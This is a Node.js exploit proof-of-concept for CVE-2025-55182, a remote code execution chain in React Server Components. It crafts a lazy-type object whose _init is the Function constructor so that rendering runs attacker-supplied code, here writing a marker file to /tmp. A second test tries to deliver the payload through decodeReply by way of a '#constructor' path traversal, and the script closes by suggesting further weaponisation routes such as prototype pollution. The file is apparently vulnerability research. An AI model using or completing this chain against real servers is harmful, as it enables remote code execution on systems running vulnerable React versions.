/**
 * CVE-2025-55182 - RCE via REACT_LAZY_TYPE
 *
 * The vulnerability chain:
 * 1. Craft object with $$typeof = REACT_LAZY_TYPE
 * 2. _init = Function (obtained via #constructor)
 * 3. _payload = "our malicious code"
 * 4. During rendering: init(payload) = Function(code) = new function
 * 5. Function is called as Component: Component(props)
 * 6. RCE!
 */

'use strict';

// Setup webpack mock
let webpackModuleIdx = 0;
const webpackServerModules = {};
const webpackServerMap = {};

global.__webpack_chunk_load__ = id => Promise.resolve();
global.__webpack_require__ = id => webpackServerModules[id];

// Register a function-exporting module
const funcIdx = '' + webpackModuleIdx++;
webpackServerModules[funcIdx] = function serverAction() { return 'legit'; };
const funcPath = 'file:///' + funcIdx;
webpackServerMap[funcPath + '#constructor'] = { id: funcIdx, chunks: [], name: 'constructor' };

process.env.NODE_ENV = 'production';
require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

const { decodeReply, renderToPipeableStream } = require('react-server-dom-webpack/server.node');

// Get the REACT_LAZY_TYPE symbol
const REACT_LAZY_TYPE = Symbol.for('react.lazy');

console.log('='.repeat(60));
console.log('CVE-2025-55182 - REACT_LAZY_TYPE RCE Test');
console.log('='.repeat(60));
console.log('');

async function testLazyRCE() {
  console.log('[TEST] Creating lazy object with Function as _init...');
  console.log('');

  // The exploit: Create a lazy object where:
  // - _init = Function constructor
  // - _payload = malicious code
  //
  // When React renders this, it calls: _init(_payload) = Function(code)
  // Then calls the result as a Component!

  const maliciousCode = `
    const fs = process.mainModule.require('fs');
    fs.writeFileSync('/tmp/lazy-rce-triggered.txt', 'LAZY RCE: ' + new Date().toISOString());
    return { rce: 'executed', time: Date.now() };
  `;

  // Clean up
  try { require('fs').unlinkSync('/tmp/lazy-rce-triggered.txt'); } catch(e) {}

  // Create the lazy object
  const lazyExploit = {
    $$typeof: REACT_LAZY_TYPE,
    _init: Function,  // The Function constructor
    _payload: maliciousCode
  };

  console.log('[TEST] Lazy object created:');
  console.log('  $$typeof:', lazyExploit.$$typeof.toString());
  console.log('  _init:', lazyExploit._init.name);
  console.log('  _payload:', maliciousCode.slice(0, 50) + '...');
  console.log('');

  // Manually test what happens
  console.log('[TEST] Simulating React\'s lazy resolution:');
  console.log('  init(payload) = Function(code)...');

  const createdFn = lazyExploit._init(lazyExploit._payload);
  console.log('  Result type:', typeof createdFn);
  console.log('  Result:', createdFn.toString().slice(0, 80) + '...');
  console.log('');

  console.log('[TEST] Simulating renderFunctionComponent:');
  console.log('  Component(props) = calling the created function...');

  const result = createdFn({});
  console.log('  Result:', result);
  console.log('');

  console.log('[TEST] Checking if RCE triggered:');
  const fileExists = require('fs').existsSync('/tmp/lazy-rce-triggered.txt');
  console.log('  File created?', fileExists);
  if (fileExists) {
    console.log('  Contents:', require('fs').readFileSync('/tmp/lazy-rce-triggered.txt', 'utf8'));
    console.log('');
    console.log('========================================');
    console.log('âœ“ RCE CONFIRMED via REACT_LAZY_TYPE!');
    console.log('========================================');
  }
  console.log('');

  return { lazyExploit, createdFn, result };
}

async function testViaDecodeReply() {
  console.log('');
  console.log('='.repeat(60));
  console.log('TEST 2: Can we craft this via decodeReply?');
  console.log('='.repeat(60));
  console.log('');

  // The challenge: We need to create an object with:
  // - $$typeof: Symbol.for('react.lazy')
  // - _init: Function (via #constructor)
  // - _payload: "our code"
  //
  // Symbols can't be directly serialized in JSON...
  // But React's Flight protocol might have special handling!

  // Check if there's a $L prefix for lazy
  console.log('[INFO] Checking Flight protocol prefixes...');
  console.log('  $F = Server Reference');
  console.log('  $@ = Chunk Reference');
  console.log('  $Q = Map');
  console.log('  $W = Set');
  console.log('  ... what about Lazy?');
  console.log('');

  // The Flight protocol uses $L for lazy elements in OUTPUT
  // But can we inject them in INPUT?

  // Actually, we can use the $F path traversal to get Function,
  // then use it in a structure that triggers lazy resolution!

  const formData = new Map();

  // Try to create a structure that becomes a lazy-like object
  // The _init needs to be Function - we can get that via $F with #constructor

  // Chunk 2: Our malicious code
  formData.set('2', JSON.stringify('return "RCE_VIA_DECODE_REPLY"'));

  // Chunk 1: Server reference that returns Function
  formData.set('1', JSON.stringify({
    id: funcPath + '#constructor',
    bound: null
  }));

  // Chunk 0: Object with lazy structure
  // _init = $F1 (resolves to Function)
  // _payload = $@2 (our code)
  formData.set('0', JSON.stringify({
    '$$typeof': Symbol.for('react.lazy').toString(), // Won't work - symbols can't serialize
    '_init': '$F1',  // Reference to Function
    '_payload': '$@2' // Reference to our code
  }));

  formData.forEach = function(cb) {
    for (const [k, v] of this.entries()) cb(v, k);
  };

  console.log('[TEST] Attempting to decode lazy structure...');

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('[RESULT]', result);
  } catch (e) {
    console.log('[ERROR]', e.message);
    console.log('');
    console.log('[INFO] Symbols cannot be directly serialized.');
    console.log('[INFO] Need to find how Flight encodes lazy types...');
  }
}

async function main() {
  await testLazyRCE();
  await testViaDecodeReply();

  console.log('');
  console.log('='.repeat(60));
  console.log('ANALYSIS');
  console.log('='.repeat(60));
  console.log('');
  console.log('The REACT_LAZY_TYPE path DOES trigger RCE when:');
  console.log('  1. _init = Function constructor');
  console.log('  2. _payload = malicious code string');
  console.log('  3. Object is rendered as a React element');
  console.log('');
  console.log('The challenge is getting this object created via');
  console.log('the Flight protocol deserialization...');
  console.log('');
  console.log('Possible approaches:');
  console.log('  1. Find how Flight serializes lazy types');
  console.log('  2. Use prototype pollution to inject $$typeof');
  console.log('  3. Find other gadget chains that call functions');
  console.log('');
}

main().catch(console.error);
